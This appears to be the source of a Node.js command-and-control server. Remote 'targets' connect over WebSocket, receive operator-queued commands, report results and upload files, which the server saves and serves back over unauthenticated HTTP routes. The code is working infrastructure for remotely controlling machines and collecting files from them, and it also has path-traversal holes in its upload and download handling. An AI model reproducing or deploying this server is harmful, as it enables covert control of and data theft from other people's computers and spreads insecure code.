// server.js
import express from "express";
import { WebSocketServer } from "ws";
import fs from "fs";
import { v4 as uuidv4 } from "uuid";
import path from "path";

const app = express();
app.use(express.json());

const PORT = process.env.PORT || 3000;
const COMMAND_FILE = "./commands.json";
const FILES_DIR = path.resolve("./uploaded_files");

if (!fs.existsSync(FILES_DIR)) fs.mkdirSync(FILES_DIR, { recursive: true });

let targets = { targets: {} };

// Load commands.json if exists
try {
  if (fs.existsSync(COMMAND_FILE)) {
    targets = JSON.parse(fs.readFileSync(COMMAND_FILE));
  }
} catch (err) {
  console.error("Failed to read commands.json:", err);
}

function saveCommands() {
  fs.writeFileSync(COMMAND_FILE, JSON.stringify(targets, null, 2));
}

// WebSocket server
const wss = new WebSocketServer({ noServer: true });
const clients = new Map();

wss.on("connection", (ws, req) => {
  let targetName = null;

  ws.on("message", (msg) => {
    try {
      const data = JSON.parse(msg);

      if (data.type === "register") {
        targetName = data.name;
        clients.set(targetName, ws);
        console.log(`✅ Target connected: ${targetName}`);

        // send pending commands
        if (targets.targets[targetName]) {
          targets.targets[targetName].forEach((cmd) => {
            if (cmd.status === "pending") ws.send(JSON.stringify(cmd));
          });
        }
        return;
      }

      if (data.type === "report" && targetName) {
        const cmdId = data.id;
        const status = data.status;
        const cmd = targets.targets[targetName].find((c) => c.id === cmdId);
        if (cmd) cmd.status = status;

        // Handle uploaded files from client
        if (data.result && data.result.file_b64 && data.result.name) {
          const filePath = path.join(FILES_DIR, data.result.name);
          fs.writeFileSync(filePath, Buffer.from(data.result.file_b64, "base64"));
          console.log(`📂 File received: ${data.result.name}`);
        }

        saveCommands();
        console.log(`Target ${targetName} executed command ${cmdId}: ${status}`);
      }
    } catch (err) {
      console.error("Invalid message:", msg);
    }
  });

  ws.on("close", () => {
    if (targetName) {
      clients.delete(targetName);
      console.log(`❌ Target disconnected: ${targetName}`);
    }
  });
});

// HTTP routes for control
app.post("/send", (req, res) => {
  const { target, type, value } = req.body;
  if (!target || !type) return res.status(400).send({ error: "Missing fields" });

  if (!targets.targets[target]) targets.targets[target] = [];

  const cmd = { id: uuidv4(), type, value: value || "", status: "pending", timestamp: Date.now() };
  targets.targets[target].push(cmd);
  saveCommands();

  const ws = clients.get(target);
  if (ws) ws.send(JSON.stringify(cmd));

  res.send({ success: true, id: cmd.id });
});

app.post("/cancel", (req, res) => {
  const { target, id } = req.body;
  if (!target || !id) return res.status(400).send({ error: "Missing fields" });

  if (targets.targets[target]) {
    const cmd = targets.targets[target].find((c) => c.id === id);
    if (cmd && cmd.status === "pending") {
      cmd.status = "canceled";
      saveCommands();
      return res.send({ success: true });
    }
  }
  res.send({ success: false, msg: "Command not found or already executed" });
});

app.get("/queue/:target", (req, res) => {
  res.send(targets.targets[req.params.target] || []);
});

app.get("/status/:target", (req, res) => {
  res.send({ online: clients.has(req.params.target) });
});

app.get("/files/:name", (req, res) => {
  const filePath = path.join(FILES_DIR, req.params.name);
  if (!fs.existsSync(filePath)) return res.status(404).send("File not found");
  res.sendFile(filePath);
});

const server = app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
server.on("upgrade", (req, socket, head) => {
  wss.handleUpgrade(req, socket, head, (ws) => {
    wss.emit("connection", ws, req);
  });
});
